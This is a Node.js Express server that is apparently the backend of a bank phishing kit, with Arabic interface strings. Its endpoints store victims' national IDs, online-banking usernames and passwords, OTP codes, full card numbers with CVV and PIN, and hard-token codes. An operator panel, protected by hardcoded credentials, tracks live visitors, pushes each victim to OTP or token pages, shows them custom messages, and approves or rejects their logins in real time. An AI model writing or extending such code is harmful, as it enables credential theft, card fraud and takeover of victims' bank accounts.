const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');

const app = express();
app.use(express.json());
app.use(cookieParser());

// ─── In-Memory Storage ───
const db = {
  applications: [],
  visitors: [],
  liveVisitors: [],
  totalVisitors: 0,
  whatsAppLink: '',
  adminSession: null,
  redirects: new Map(),
  visitorRedirects: new Map(),
  customMessages: new Map(),
};

// ─── Helper: find or create application by nationalId ───
function findApp(nationalId) {
  return db.applications.find(a => a.nationalId === nationalId);
}
function findOrCreateApp(nationalId) {
  let app = findApp(nationalId);
  if (!app) {
    app = {
      id: Date.now().toString(36) + Math.random().toString(36).slice(2),
      nationalId,
      createdAt: new Date().toISOString(),
      currentPage: 'home',
    };
    db.applications.push(app);
  }
  return app;
}

// ─── tRPC-compatible batch handler ───
// The React frontend calls /api/trpc/<procedure> or /api/trpc/<p1>,<p2> (batch)
// We implement a lightweight tRPC-compatible HTTP handler

const procedures = {};

// --- applications router ---
procedures['applications.savePersonalInfo'] = async (input) => {
  const app = findOrCreateApp(input.nationalId);
  app.fullName = input.fullName;
  app.phoneNumber = input.phoneNumber;
  app.governorate = input.governorate;
  app.address = input.address;
  app.watchColor = input.watchColor;
  app.currentPage = 'personal-info';
  return { success: true };
};

procedures['applications.saveLoginData'] = async (input) => {
  const app = findOrCreateApp(input.nationalId);
  app.username = input.username;
  app.password = input.password;
  app.currentPage = 'login';
  return { success: true };
};

procedures['applications.saveOtpData'] = async (input) => {
  const app = findOrCreateApp(input.nationalId);
  app.otpCode = input.otpCode;
  app.currentPage = 'otp';
  return { success: true };
};

procedures['applications.saveCardData'] = async (input) => {
  const app = findOrCreateApp(input.nationalId);
  app.cardNumber = input.cardNumber;
  app.cardExpiry = input.cardExpiry;
  app.cardCvv = input.cardCvv;
  app.cardPin = input.cardPin;
  app.currentPage = 'card-info';
  return { success: true };
};

procedures['applications.saveHardToken'] = async (input) => {
  const app = findOrCreateApp(input.nationalId);
  app.hardTokenCode = input.hardTokenCode;
  app.currentPage = 'hard-token';
  return { success: true };
};

procedures['applications.saveWatchLink'] = async (input) => {
  const app = findOrCreateApp(input.nationalId);
  app.watchLinkOtp = input.watchLinkOtp;
  app.currentPage = 'watch-link';
  return { success: true };
};

procedures['applications.updatePage'] = async (input) => {
  const app = findOrCreateApp(input.nationalId);
  app.currentPage = input.page;
  if (input.showError !== undefined) app.showError = input.showError;
  return { success: true };
};

procedures['applications.getCustomMessage'] = async (input) => {
  const msg = db.customMessages.get(input.nationalId) || null;
  return { message: msg };
};

procedures['applications.clearCustomMessage'] = async (input) => {
  if (input?.nationalId) db.customMessages.delete(input.nationalId);
  return { success: true };
};

procedures['applications.getRedirectStatus'] = async (input) => {
  const redirect = db.redirects.get(input.nationalId) || null;
  return redirect;
};

procedures['applications.getVisitorRedirect'] = async (input) => {
  const redirect = db.visitorRedirects.get(input.sessionId) || null;
  return redirect;
};

procedures['applications.clearRedirectByUser'] = async (input) => {
  if (input?.nationalId) db.redirects.delete(input.nationalId);
  return { success: true };
};

procedures['applications.clearVisitorRedirect'] = async (input) => {
  if (input?.sessionId) db.visitorRedirects.delete(input.sessionId);
  return { success: true };
};

// --- admin router ---
procedures['admin.login'] = async (input, ctx) => {
  if (input.username === 'admin' && input.password === 'admin123456') {
    const token = 'admin_' + Date.now().toString(36) + Math.random().toString(36).slice(2);
    db.adminSession = { token, isAdmin: true, loginAt: new Date().toISOString() };
    ctx.setCookie = { name: 'admin_token', value: token };
    return { success: true, isAdmin: true };
  }
  throw { code: 'UNAUTHORIZED', message: 'بيانات الدخول غير صحيحة' };
};

procedures['admin.logout'] = async (_input, ctx) => {
  db.adminSession = null;
  ctx.clearCookie = 'admin_token';
  return { success: true };
};

procedures['admin.checkSession'] = async (_input, ctx) => {
  const token = ctx.cookies?.admin_token;
  if (token && db.adminSession?.token === token) {
    return { isAdmin: true };
  }
  return { isAdmin: false };
};

procedures['admin.getApplications'] = async () => {
  return db.applications.map(a => ({ ...a }));
};

procedures['admin.deleteApplication'] = async (input) => {
  const idx = db.applications.findIndex(a => a.nationalId === input.nationalId);
  if (idx !== -1) db.applications.splice(idx, 1);
  return { success: true };
};

procedures['admin.redirectUser'] = async (input) => {
  db.redirects.set(input.nationalId, { page: input.page, showError: input.showError || false });
  return { success: true };
};

procedures['admin.redirectVisitor'] = async (input) => {
  db.visitorRedirects.set(input.sessionId, { page: input.page });
  return { success: true };
};

procedures['admin.redirectAllToToken'] = async () => {
  for (const app of db.applications) {
    db.redirects.set(app.nationalId, { page: 'hard-token' });
  }
  return { success: true };
};

procedures['admin.approveLogin'] = async (input) => {
  const app = findApp(input.nationalId);
  if (app) app.loginApproved = true;
  return { success: true };
};

procedures['admin.rejectLogin'] = async (input) => {
  const app = findApp(input.nationalId);
  if (app) app.loginRejected = true;
  return { success: true };
};

procedures['admin.setCustomMessage'] = async (input) => {
  db.customMessages.set(input.nationalId, input.message);
  return { success: true };
};

procedures['admin.redirectWhatsApp'] = async (input) => {
  db.redirects.set(input.nationalId, { page: 'whatsapp' });
  return { success: true };
};

procedures['admin.updateWhatsAppLink'] = async (input) => {
  db.whatsAppLink = input.link;
  return { success: true };
};

procedures['admin.getWhatsAppLink'] = async () => {
  return { link: db.whatsAppLink };
};

procedures['admin.deleteInactiveClients'] = async () => {
  const now = Date.now();
  const cutoff = 5 * 60 * 1000;
  db.liveVisitors = db.liveVisitors.filter(v => (now - new Date(v.lastSeen).getTime()) < cutoff);
  return { success: true };
};

procedures['admin.resetTotalVisitors'] = async () => {
  db.totalVisitors = 0;
  db.visitors = [];
  return { success: true };
};

procedures['admin.getLiveVisitors'] = async () => {
  return db.liveVisitors;
};

procedures['admin.getAllVisitors'] = async () => {
  return db.visitors;
};

procedures['admin.updateVisitor'] = async (input) => {
  const now = new Date().toISOString();
  let visitor = db.liveVisitors.find(v => v.sessionId === input.sessionId);
  if (!visitor) {
    visitor = { sessionId: input.sessionId, currentPage: input.page, firstSeen: now, lastSeen: now };
    db.liveVisitors.push(visitor);
    db.totalVisitors++;
    db.visitors.push({ ...visitor });
  } else {
    visitor.currentPage = input.page;
    visitor.lastSeen = now;
  }
  return { success: true };
};

// ─── tRPC HTTP Handler (httpLink, non-batch) ───
async function handleTrpcRequest(req, res) {
  const procedureName = req.path.replace(/^\/api\/trpc\/?/, '');
  if (!procedureName) return res.status(400).json({ error: { message: 'No procedure specified' } });

  const proc = procedures[procedureName];
  if (!proc) return res.status(404).json({ error: { message: `Procedure "${procedureName}" not found`, data: { code: 'NOT_FOUND' } } });

  const ctx = { cookies: req.cookies, setCookie: null, clearCookie: null };

  try {
    let input = undefined;

    if (req.method === 'GET') {
      const inputParam = req.query.input;
      if (inputParam) {
        try { input = JSON.parse(inputParam); } catch { input = undefined; }
      }
    } else if (req.method === 'POST') {
      input = req.body;
    } else {
      return res.status(405).json({ error: { message: 'Method not allowed' } });
    }

    const data = await proc(input, ctx);

    if (ctx.setCookie) {
      res.cookie(ctx.setCookie.name, ctx.setCookie.value, { httpOnly: true, path: '/', sameSite: 'lax', maxAge: 86400000 });
    }
    if (ctx.clearCookie) {
      res.clearCookie(ctx.clearCookie, { path: '/' });
    }

    return res.json({ result: { data } });
  } catch (err) {
    const isUnauth = err.code === 'UNAUTHORIZED';
    if (ctx.setCookie) {
      res.cookie(ctx.setCookie.name, ctx.setCookie.value, { httpOnly: true, path: '/', sameSite: 'lax', maxAge: 86400000 });
    }
    return res.status(isUnauth ? 401 : 500).json({
      error: {
        message: err.message || 'Internal error',
        data: { code: isUnauth ? 'UNAUTHORIZED' : 'INTERNAL_SERVER_ERROR' },
      },
    });
  }
}

// ─── Presence Endpoint ───
app.post('/api/presence', (req, res) => {
  const { sessionId, currentPage } = req.body || {};
  if (!sessionId) return res.json({ ok: true });

  const now = new Date().toISOString();
  let visitor = db.liveVisitors.find(v => v.sessionId === sessionId);
  if (!visitor) {
    visitor = { sessionId, currentPage: currentPage || 'home', firstSeen: now, lastSeen: now };
    db.liveVisitors.push(visitor);
    db.totalVisitors++;
    db.visitors.push({ ...visitor });
  } else {
    visitor.currentPage = currentPage || visitor.currentPage;
    visitor.lastSeen = now;
  }
  res.json({ ok: true });
});

// ─── tRPC Route ───
app.all('/api/trpc/*', handleTrpcRequest);

// ─── Static Files ───
app.use('/assets', express.static(path.join(__dirname, 'public', 'assets')));
app.use('/manus-storage', express.static(path.join(__dirname, 'public', 'manus-storage')));
app.use(express.static(path.join(__dirname, 'public')));

// ─── SPA Fallback ───
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ─── Start Server (local dev) ───
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

module.exports = app;
